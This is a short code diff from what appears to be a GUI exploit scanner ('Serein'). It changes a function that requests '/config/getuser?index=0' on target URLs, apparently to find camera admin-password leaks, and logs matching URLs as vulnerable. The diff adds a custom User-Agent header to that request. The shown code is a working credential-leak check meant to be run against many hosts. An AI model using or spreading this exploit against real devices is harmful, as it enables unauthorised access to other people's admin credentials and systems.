@@ -6,8 +6,11 @@ from ttkbootstrap.constants import *
 def dcs_admin_passwd_leak_exp(url):
     poc = r"""/config/getuser?index=0"""
     url = url + poc
+    headers = {
+        "User-Agent": "Serein v2.7"
+    }
     try:
-        res = requests.get(url, verify=False, timeout=3)
+        res = requests.get(url, headers = headers, verify=False, timeout=3)
         if "name=" in res.text:
             dcs_admin_passwd_leak_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
             dcs_admin_passwd_leak_text.see(END)
